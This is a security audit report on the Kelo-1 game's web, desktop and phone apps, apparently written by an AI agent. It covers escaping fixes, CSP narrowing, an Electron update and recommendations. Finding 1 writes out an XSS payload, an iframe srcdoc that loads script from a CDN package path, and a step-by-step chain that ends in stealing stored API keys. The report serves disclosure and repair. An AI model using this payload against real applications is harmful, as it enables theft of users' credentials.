# Security audit of Kelo-1: report

Branch with fixes: `agent/audit-security` (from `main` at 8850b18). Test script: `qa/securitytest.js` (on this results branch, `qa-results-audit-security`).
Scope: the web page (GitHub Pages), the Windows Electron app (`desktop/`), the iOS/Android Capacitor apps (`capacitor.config.json`, `scripts/build-web.mjs`, `js/native.js`), the shop page, every HTML sink in `js/*.js`, API key handling, save import, the code-request/upgrade system, dependencies and git history.

## Summary

| # | Severity | Finding | Status |
|---|----------|---------|--------|
| 1 | **High** | An imported save could run script in the page: 5 panels put save-supplied "numbers" into HTML without escaping. With the CSP's CDN allowance this became real script execution, which could steal API keys | **Fixed** (fd1c9be), test proves it |
| 2 | **High** (defence in depth) | The CSP allows scripts from whole CDN hosts that serve anyone's code (`cdn.jsdelivr.net`, `unpkg.com`, `cdnjs.cloudflare.com`), so any HTML injection becomes script via `<iframe srcdoc>` | **Partly fixed** (01ea3bc: unpkg and cdnjs pinned to exact paths). jsdelivr must stay open for the Anthropic SDK import: see recommendation R1 |
| 3 | Medium | Electron 44.7.2 is in the range of a high npm advisory (compromised eMudhra intermediate certificates) | **Fixed** (3956c8d: 44.11.2, patch release in the same major) |
| 4 | Low | Agenda status shown unescaped (safe only because of load order) | **Fixed** (3840c6c) |
| 5 | Low | Post tab and photo album `<img src>` accepted any URL from a save (escaped, but not limited to data:image) | **Fixed** (3840c6c) |
| 6 | Low | CDN scripts have no Subresource Integrity on the web/Electron page | Recommendation R2 (bytes could not be fetched from here) |
| 7 | Low | The Anthropic SDK is loaded at run time from jsdelivr and is handed the API key | Recommendation R1 |
| 8 | Low | Build-time-only advisories in electron-builder's tree (minimatch, glob, rimraf) | Recommendation R4 |
| 9 | Info | Malformed save values can throw inside one panel's render (no injection) | Recommendation R5 |
| 10 | Info | On the phone apps Claude can never be used: the app CSP (`script-src 'self'`) blocks the SDK import | Recommendation R1 fixes this too |

No critical findings.
- **Secrets:** no secrets anywhere in git history. I swept all 783 commits on all branches with regexes for Google `AIza…`, `sk-ant-…`, `sk-…`, GitHub tokens, AWS keys, Slack tokens and private-key blocks: 0 hits.
- **Prompt injection:** no path from it to anything outside the game. The only network writes are the AI calls themselves.
- **Upgrades:** the self-coded upgrade system never runs code.

## Findings in detail

### 1. Hostile save → script execution (High, fixed)

`loadPersistentBrainState` (js/agent.js:1247) checks only the top-level shape of each saved field, so an imported backup can put any string in any nested field. Five panels printed such fields straight into HTML:

| Sink | Expression | Source |
|------|-----------|--------|
| js/shopkeeping.js:551 (`renderShopPanel`) | `${l.sales}` | `state.shop.listings[].sales` |
| js/plants.js:1148, :1157 (`renderPlantsPanel`) | `${bp.batches}`, `${bp.wasted}`, `${bp.lastTicket.cement/wc/slump/strength}`, `${ap.batches}`, `${ap.wasted}` | `state.batchPlant`, `state.asphaltPlant`; `ensureAggregatePlantState` only does `x = x \|\| 0` |
| js/skills.js:246-253 (`renderSkillsList`) | `${s.level}`, `level ${s.level}` (in `aria-label`), `${s.sessions}` | `state.skills[*]` (re-rendered every 5 s) |
| js/machines.js:569 (`renderWorkshopBrain`) | `Lv ${lvl}` (`machineLevel` returns `state.skills['ws-'+key].level` as-is) | same |
| js/upgrades.js:1083 (`renderWorldUpgradesList`) | `v${u.version}` | `state.worldUpgrades[]` (`rebuildWorldUpgrades` revalidates only `code`) |

**Exploit (reproduced on unfixed `main`):**
1. Someone shares a "brain backup" whose `worldUpgrades[0].version` is `<iframe srcdoc="<script src='https://cdn.jsdelivr.net/npm/<any package>/x.js'></script>">`.
2. The player imports it (Settings → import; one confirm dialog), and the page reloads.
3. The upgrades list renders the iframe. Its srcdoc inherits the page's CSP, which allows jsdelivr, so the script runs same-origin with the game.
4. From there it can read `localStorage` `kelo1_*_api_key` on the web, or call `window.keloDesktop.getKeys()` in the Electron app, which returns the decrypted keys.

Inline handlers (`onerror=`) and `javascript:` URLs were already blocked by the CSP. The srcdoc + CDN route is what made it real.

Test evidence with `securitytest.js save`:
- On `main`: `script ran: https://cdn.jsdelivr.net/npm/kelo-evil/save-upg-version.js`, with injected elements from the upgrade version, both plants' batches/wasted and the other fields (exit 1).
- On the branch: `script ran: no`, `injected elements: none`, exit 0.

Fix: `escapeHtml(...)` around each value at the sink (display is unchanged for real numbers). I kept it to the render sites so it can't conflict with the parallel sessions. See R5 for the type check on load.

### 2. CSP allows whole CDN hosts (High, partly fixed)

index.html:8 had `script-src 'self' file: https://cdn.tailwindcss.com https://unpkg.com https://cdnjs.cloudflare.com https://cdn.jsdelivr.net`. jsdelivr and unpkg serve every npm package, and cdnjs serves many libraries (including old AngularJS, a known CSP-bypass gadget). So the CSP did not stop HTML injection from becoming script.

Proof: a standalone probe put the page's own CSP on a test page, injected `<iframe srcdoc="<script src=CDN/evil.js>">` with `innerHTML`, and served `evil.js` locally.

| Payload | Before | After 01ea3bc |
|---------|--------|---------------|
| jsdelivr | EXECUTED | EXECUTED |
| unpkg | EXECUTED | blocked |
| cdnjs | EXECUTED | blocked |
| inline `onerror` | blocked | blocked |
| `javascript:` iframe | blocked | blocked |

Fix 01ea3bc narrows `script-src` to the exact paths the page loads:
- `https://unpkg.com/@phosphor-icons/web@2.1.1` (plus the trailing-slash form; its redirect target is allowed because CSP ignores paths after a redirect)
- `https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/`
- `cdn.tailwindcss.com` stays as a host, since it serves only Tailwind.

The phone apps are unaffected: `build-web.mjs` swaps in its own strict CSP with `script-src 'self'`. The shop page already allowed only `'self'` + Tailwind.

**Not fixed:** `https://cdn.jsdelivr.net` must stay open because `js/agent.js:551` does `import('https://cdn.jsdelivr.net/npm/@anthropic-ai/sdk@1.3.0/+esm')`. jsdelivr's `+esm` build pulls its dependencies (standardwebhooks, @opentelemetry/api, …) from other `/npm/…/+esm` paths whose exact versions I could not see from this machine (CDNs blocked). A path list that misses one would silently break Claude on the web. See R1.

### 3. Electron version (Medium, fixed)

`npm audit`: `electron` 44.0.0-alpha.1 – 44.9.0 is HIGH ("Mitigation for compromised eMudhra intermediate certificates"). 3956c8d bumps it to 44.11.2 (same major, patch releases) in package.json and package-lock.json. Not built or run here (no Windows/Electron runtime). Run `npm ci && npm start` once before the next `dist:win`.

The Electron hardening itself is already good (desktop/main.js):
- `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, `webviewTag: false`
- `setWindowOpenHandler`: only app files open in-app, with the same safe prefs; everything else goes to `openExternalSafely`, https only
- `will-navigate` locks the window to the app folder; `will-attach-webview` is denied
- every permission request and check is refused
- every IPC handler checks `senderFrame.url` against the app folder
- memory keys are limited to `^kelo1_[a-z0-9_]{1,80}$` with no `api_key` (no path traversal), with a size cap and a quota
- API keys are kept with `safeStorage` (DPAPI), only in memory when encryption is unavailable, and never written in plain text
- the preload exposes only keys/memory/menu events, with no Node
- there is no auto-updater

The one weakness is finding 1/2: any script running in the page can call `keloDesktop.getKeys()`.

### 4–5. Small escaping gaps (Low, fixed)

- js/agenda.js:430: `${statusWord[t.status] || t.status}` is now escaped.
- js/portal.js:92 and :155: mailbox thumbs and album photos were escaped, but any URL was accepted. Now only `data:image/(jpeg|png|webp);base64` is accepted (new `portalSafeImg`, the same rule as `talkSafeImg`). `String(m.note)` also guards a non-string note.

### Things checked and found safe

- **All HTML sinks:** I reviewed every `innerHTML`, `insertAdjacentHTML` and `perfSetHtml`, about 75 sites in 29 files. AI text, Wikipedia/Wiktionary/DuckDuckGo titles and extracts, visitor chat and names, invented item names, BOM/build names, code-request text and gift names all go through `escapeHtml` in quoted attributes or text.
  - The web-history links are limited to https on en.wikipedia.org, en.wiktionary.org and duckduckgo.com (main.js:546).
  - The shop contact is limited to `mailto:`/https, and listing images to data:image.
  - The GitHub issue link is a constant prefix plus `encodeURIComponent`.
  - Wiktionary HTML is parsed with `DOMParser` (inert) for `textContent` only.
- **Upgrades / code requests:**
  - There is no `eval`, `new Function`, string `setTimeout` or dynamic dispatch anywhere. The `new Function` hit at upgrades.js:4 is a comment.
  - `validateWorldUpgrade` deep-copies the input through JSON, caps it at 9000 chars, rejects unknown keys (`__proto__`/`constructor` fail), and string fields must match enums or `UPG_SAFE_TEXT`.
  - Routine steps dispatch through fixed `if` chains.
  - Code requests (`coderequests.js`, `wishfeatures.js`) only switch on built-in features from a fixed table, matched by regex. AI or save text never becomes code.
- **Prompt injection** (Wikipedia/DDG text in his prompts): the AI's answer can only change in-game state, through the validated fields of `applyDecision`.
  - The only network writes are the AI calls to Google/Anthropic. There is no outbound posting, no GitHub writes and no file writes outside his memory.
  - The worst case is in-game: odd speech, requests to the visitor, world edits that are still bound by the build rules.
- **Save import** (memory.js:159):
  - 15 MB cap, `format` check, only `kelo1_*` string entries, never API keys, and a confirm dialog.
  - The loader copies only fields `state` already owns (`hasOwnProperty`), so `__proto__` is ignored and there is no prototype pollution.
  - `JSON.parse` never pollutes.
- **API keys:**
  - Web: localStorage (unavoidable for a static site), sent only in the `x-goog-api-key` header to generativelanguage.googleapis.com, or through the SDK to api.anthropic.com.
  - Exports leave out `api_key|token|secret` keys.
  - Never logged: no `console.*` prints a key.
  - Desktop: DPAPI. Phones: Keychain/Keystore via `@aparajita/capacitor-secure-storage`; `native.js` refuses to write `api_key` keys to files.
- **Capacitor:**
  - No `server.url` and no `allowNavigation`, so external links go to the system browser.
  - Android: `allowMixedContent: false`, `webContentsDebuggingEnabled: false`, no cleartext, FileProvider not exported.
  - The app CSP is strict (`script-src 'self'`, `frame-src 'none'`).
  - `loggingBehavior: "debug"` means logs in debug builds only.
- **External links:** every `target="_blank"` and `window.open` uses `noopener`. Downloads use blob URLs.
- **Other entry points:** no service worker, no `postMessage` listeners, no URL parameters read anywhere.

## Recommendations (not done: they change behaviour or can't be verified from here)

- **R1 (most important): stop importing the Anthropic SDK from jsdelivr at run time.**
  - Call `https://api.anthropic.com/v1/messages` with `fetch`, using the headers `x-api-key`, `anthropic-version` and `anthropic-dangerous-direct-browser-access: true`.
  - Alternatively, vendor the SDK into `js/vendor/` like three.js.
  - Then pin jsdelivr in `script-src` to `https://cdn.jsdelivr.net/npm/three@0.128.0/`, which closes finding 2 completely.
  - It also stops a CDN-served third-party bundle from receiving the key, and makes Claude work in the phone apps (today their CSP blocks the import).
  - Not done here because it changes the AI call path (betas/fallbacks), and I can't test it against the real API from this machine.
- **R2: add Subresource Integrity** (`integrity="sha384-…" crossorigin="anonymous"`) to the four CDN `<script>` tags in index.html and shop.html: Tailwind 3.4.17, Phosphor 2.1.1, three r128, OrbitControls 0.128.0.
  - Compute the hashes from the exact CDN bytes. This machine cannot reach the CDNs, and a wrong hash would blank the site, so I didn't guess.
  - The Phosphor script injects its own stylesheets, so it needs its CSS pinned too, or should be vendored.
- **R3: Electron packaging hardening:**
  - Set Electron Fuses in electron-builder (`RunAsNode` off, `EnableNodeOptionsEnvironmentVariable` off, `EnableNodeCliInspectArguments` off, `EnableEmbeddedAsarIntegrityValidation` + `OnlyLoadAppFromAsar` on).
  - Consider removing the `toggleDevTools` menu item from release builds.
  - Needs a Windows build to verify.
- **R4:** the build tool's tree has moderate advisories: minimatch ReDoS, glob AbortSignal, via app-builder-lib/@electron/universal. npm's suggested fix downgrades electron-builder to 24.x, so instead wait for or upgrade to a fixed 26.x. They are used at build time only and never shipped to players.
- **R5: type-check nested numbers when a save loads.** For example, coerce `skills[*].level/xp/sessions`, `batchPlant`/`asphaltPlant` counters, `shop.listings[].sales` and `worldUpgrades[].version` with `Number(...) || 0` in `loadPersistentBrainState` or the `ensure*` helpers.
  - Also drop records with the wrong shape: `garage.js:98` throws on unknown `v.service` keys, `main.js:107` throws on an invalid date, and `agenda.js:433` throws on non-array `steps` before `agendaAfterLoad`.
  - Not done because it touches the shared load path the other audit sessions are also working in.
- **R6:** consider narrowing `file:` in the web/Electron CSP to the app folder, or dropping it on the website, and dropping `https://cdn.jsdelivr.net` from `connect-src` (nothing fetches from it; `import()` uses `script-src`). Both are low value and need an Electron run to confirm.
- **R7:** Android `allowBackup="true"` includes his memory files in device backups. Keys are in the Keystore and are not exportable. Set it to `false` if the owner doesn't want brains in cloud backups (a product choice).

## Tests

All runs were on this cloud machine (software GL), one at a time, with `KELO_ROOT` pointing at the `agent/audit-security` checkout.

`qa/securitytest.js <mode>`: each payload carries an `<iframe srcdoc>` that loads a script from cdn.jsdelivr.net (the test serves it as `parent.__pwned = …`), an `<img onerror>` and a `<b data-xss>` marker. After the injection it renders every panel and opens every tab, then fails if any script ran, any injected element is in the DOM, or there is any page error.

| Mode | What it injects | Branch | `main` (before) |
|------|-----------------|--------|-----------------|
| `ai` | Gemini reply (routed) parsed by `callLLMJSON` → `applyDecision`: title, thought, speech, diary, mood, obsession, opinion, request, invention, hobby, concept | exit 0, nothing ran, nothing injected, page errors: none | – |
| `wiki` | hostile Wikipedia summary/search/link titles and extracts through `wikiSummary` + `searchOnce` | exit 0, page errors: none | – |
| `visitor` | 5 hostile visitor messages (plain, question, name, build, make) through `handleVisitorChatMessage` | exit 0, page errors: none | – |
| `save` | hostile backup across ~20 fields, then reload | exit 0, page errors: none | **exit 1**: script ran from `save-upg-version`; markup injected from upgrades, plants, … |
| `csp` | informational: which CDN hosts an injected srcdoc iframe can load script from | exit 0; `{"jsdelivr":"EXECUTED","unpkg":"blocked","cdnjs":"blocked"}` (jsdelivr open until R1) | – |

Regression harness (`harness.js`) on the branch: `reload`, `chat`, `ui`, `skills` and `printshop` all exit 0 with "page errors: none" (`reload` also ran once right after the CSP change, before the other fixes: exit 0, page errors: none).

Other checks:
- `node --check` passes on every changed file.
- The duplicate-name check prints nothing.
- The standalone CSP probe results are in the finding 2 table above.

## Commits on `agent/audit-security`

- 3840c6c Escape agenda status, only show data:image thumbs in the Post tab and photo album
- fd1c9be Escape save-supplied numbers in the shop, plants, skills, workshop and upgrades panels
- 01ea3bc CSP: allow scripts only from the exact unpkg and cdnjs paths the page loads
- 3956c8d Electron 44.7.2 -> 44.11.2 (npm audit: compromised eMudhra intermediate certificates advisory)
